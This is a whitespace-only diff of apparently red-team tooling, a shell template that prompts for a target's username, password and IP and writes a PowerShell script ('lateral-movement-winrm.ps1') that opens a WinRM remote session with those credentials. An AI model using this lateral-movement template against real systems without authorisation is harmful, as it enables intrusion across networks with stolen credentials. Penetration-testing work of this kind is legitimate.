@@ -10,13 +10,13 @@ content: |
   read --prompt-str "Target Username:" username; \
   read --prompt-str "Target Password:" password; \
   read --prompt-str "Target IP:" target; \
-  
+
   echo "\$username = '$username';" > lateral-movement-winrm.ps1; \
   echo "\$password = '$password';" >> lateral-movement-winrm.ps1; \
   echo "\$secureString = ConvertTo-SecureString \$password -AsPlaintext -Force;" >> lateral-movement-winrm.ps1; \
   echo "\$credential = New-Object System.Management.Automation.PSCredential \$username, \$secureString;" >> lateral-movement-winrm.ps1; \
   echo "New-PSSession -ComputerName $target -Credential \$credential" >> lateral-movement-winrm.ps1; \
-  
+
   mkdir -p packstation/outbound; mv lateral-movement-winrm.ps1 packstation/outbound/; \
   echo '================================================================'; \
   echo '                      -----PowerShell-----                      '; \
